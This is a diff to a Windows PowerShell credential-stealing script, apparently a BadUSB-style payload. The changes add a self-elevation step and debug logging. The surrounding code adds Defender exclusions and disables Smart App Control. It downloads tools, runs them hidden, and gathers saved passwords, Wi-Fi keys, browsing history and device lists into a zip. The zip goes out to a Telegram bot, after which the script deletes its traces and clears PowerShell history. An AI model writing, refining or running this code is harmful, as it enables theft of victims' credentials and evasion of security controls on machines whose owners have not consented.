@@ -12,7 +12,19 @@ $ErrorActionPreference = 'Continue'
 $ProgressPreference    = 'SilentlyContinue'
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    $self = $PSCommandPath
+    if (-not $self) { $self = 'C:\Users\Public\p.ps1' }
+    Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoExit','-ep','bypass','-File',$self) -Verb RunAs
+    exit
+}
+
+$log = 'C:\Users\Public\pslog.txt'
+function S($m) { Write-Host ">> $m" -ForegroundColor Cyan; try { Add-Content $log ("[{0}] {1}" -f (Get-Date -Format HH:mm:ss), $m) } catch {} }
+
+S "admin=$isAdmin  user=$env:USERNAME  ps=$($PSVersionTable.PSVersion)"
 
 $pub = $env:PUBLIC
 if (-not $pub) { $pub = 'C:\Users\Public' }
@@ -20,15 +32,18 @@ if (-not $pub) { $pub = 'C:\Users\Public' }
 $basePath   = Join-Path $pub 'scripts'
 $dumpFolder = Join-Path $basePath ('{0}-{1}' -f $env:USERNAME, (Get-Date -Format yyyy-MM-dd))
 $dumpFile   = $dumpFolder + '.zip'
+S "basePath=$basePath"
 
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Set-Location $basePath
 
 Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
+S 'exclusions'
 
 $ciKey   = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
 $prevSac = (Get-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
+S "prevSac=$prevSac"
 Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value 0 -ErrorAction SilentlyContinue
 & CiTool --refresh --json | Out-Null
 
@@ -41,7 +56,8 @@ $tools = [ordered]@{
 foreach ($t in $tools.Keys) {
   $dst = Join-Path $basePath $t
   for ($i = 0; $i -lt 3; $i++) {
-    try { Invoke-WebRequest $tools[$t] -OutFile $dst -UseBasicParsing -TimeoutSec 60; break } catch { Start-Sleep 2 }
+    try { Invoke-WebRequest $tools[$t] -OutFile $dst -UseBasicParsing -TimeoutSec 60; S "dl ok $t"; break }
+    catch { S ("dl FAIL $t #$i " + $_.Exception.Message); Start-Sleep 2 }
   }
 }
 
@@ -54,31 +70,34 @@ $jobs = @(
 
 foreach ($j in $jobs) {
   $exe = Join-Path $basePath $j.exe
-  if (-not (Test-Path $exe)) { continue }
+  if (-not (Test-Path $exe)) { S "skip no-exe $($j.exe)"; continue }
   $out = Join-Path $basePath $j.args[-1]
-  try { Start-Process -FilePath $exe -ArgumentList $j.args -WorkingDirectory $basePath -WindowStyle Hidden } catch {}
+  S "run $($j.exe)"
+  try { Start-Process -FilePath $exe -ArgumentList $j.args -WorkingDirectory $basePath -WindowStyle Hidden } catch { S ("start FAIL " + $_.Exception.Message) }
   $n = 0
   while ($n -lt $j.wait -and -not (Test-Path $out)) { Start-Sleep 1; $n++ }
   Start-Sleep 2
   Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($j.exe)) -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+  S "done $($j.exe) out=$(Test-Path $out)"
 }
 
 $files = 'passwords.txt','wifi.txt','connected_devices.txt','history.txt' |
          ForEach-Object { Join-Path $basePath $_ } | Where-Object { Test-Path $_ -PathType Leaf }
-if (-not $files) { exit 1 }
+S "files: $($files -join ', ')"
+if (-not $files) { S 'NO FILES'; Read-Host 'Enter'; exit 1 }
 
 Move-Item $files -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
 Compress-Archive -Path (Join-Path $dumpFolder '*') -DestinationPath $dumpFile -Force -ErrorAction SilentlyContinue
-if (-not (Test-Path $dumpFile)) { exit 1 }
+S "zip=$(Test-Path $dumpFile)"
+if (-not (Test-Path $dumpFile)) { S 'NO ZIP'; Read-Host 'Enter'; exit 1 }
 
 if (-not ('System.Net.Http.HttpClient' -as [type])) {
   $p = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64\' -Recurse -Filter 'System.Net.Http.dll' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
-  if ($p) { Add-Type -Path $p } else { exit 1 }
+  if ($p) { Add-Type -Path $p; S 'http dll ok' } else { S 'http dll MISSING'; Read-Host 'Enter'; exit 1 }
 }
 
 $uri  = "https://api.telegram.org/bot$Token/sendDocument"
 $sent = $false
-
 for ($i = 0; $i -lt 3 -and -not $sent; $i++) {
   $fs = $null; $client = $null; $content = $null
   try {
@@ -92,14 +111,16 @@ for ($i = 0; $i -lt 3 -and -not $sent; $i++) {
     $sc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')
     $content.Add($sc, 'document', [IO.Path]::GetFileName($dumpFile))
     $resp = $client.PostAsync($uri, $content).GetAwaiter().GetResult()
+    S "tg #$i status=$([int]$resp.StatusCode)"
     if ($resp.IsSuccessStatusCode) { $sent = $true }
-  } catch { Start-Sleep 5 }
+  } catch { S ("tg #$i ex " + $_.Exception.Message); Start-Sleep 5 }
   finally {
     if ($fs) { $fs.Close(); $fs.Dispose() }
     if ($content) { $content.Dispose() }
     if ($client) { $client.Dispose() }
   }
 }
+S "sent=$sent"
 
 Set-Location $pub
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
@@ -112,4 +133,6 @@ if ($null -ne $prevSac) { Set-ItemProperty $ciKey -Name VerifiedAndReputablePoli
 $ws = New-Object -ComObject WScript.Shell
 1..4 | ForEach-Object { $ws.SendKeys('{CAPSLOCK}'); Start-Sleep 1 }
 Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+S 'END'
+Read-Host 'Enter'
 exit
